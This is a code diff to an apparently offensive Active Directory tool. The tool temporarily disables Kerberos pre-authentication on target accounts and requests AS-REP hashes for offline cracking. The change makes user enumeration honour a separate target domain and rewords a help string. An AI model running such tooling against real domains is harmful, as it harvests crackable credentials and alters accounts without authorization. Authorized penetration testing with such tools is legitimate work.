@@ -394,7 +394,7 @@ def parse_args():
     parser = argparse.ArgumentParser(description = "Temporarily sets DONT_REQ_PREAUTH and requests AS-REP hashes for target accounts")
     parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
     parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
-    parser.add_argument('-D', '--target-domain', action='store', help='Domain to request AS-REPs from when it differs from the authentication domain (for trusted domains).')
+    parser.add_argument('-D', '--target-domain', action='store', help='Target domain to enumerate and request AS-REPs from; --dc-ip should point to a DC in this domain.')
     parser.add_argument('-U', '--users-file', help='File with user per line to test')
     parser.add_argument('--request-user', action='store', metavar='username', help='Requests an AS-REP for the specified username')
     parser.add_argument('-o', '--output-file', action='store', help='Output file for AS-REP hashes')
@@ -447,16 +447,16 @@ def main_asreproast():
         _, ldap_session = init_ldap_session(use_kerb, args.use_ldaps, args.dc_ip,
                                             args.auth_domain, args.auth_username,
                                             args.auth_password, lm_hash, nt_hash)
+        domain = args.target_domain or args.auth_domain
         if args.request_user:
-            users = get_users(ldap_session, args.auth_domain, [args.request_user])
+            users = get_users(ldap_session, domain, [args.request_user])
         elif args.users_file:
             with open(args.users_file, "r") as user_file:
                 names = [line.strip() for line in user_file if line.strip()]
-            users = get_users(ldap_session, args.auth_domain, names)
+            users = get_users(ldap_session, domain, names)
         else:
-            users = get_users(ldap_session, args.auth_domain)
+            users = get_users(ldap_session, domain)
 
-        domain = args.target_domain or args.auth_domain
         for username, details in users.items():
             dn = details.get('dn')
             if not dn:
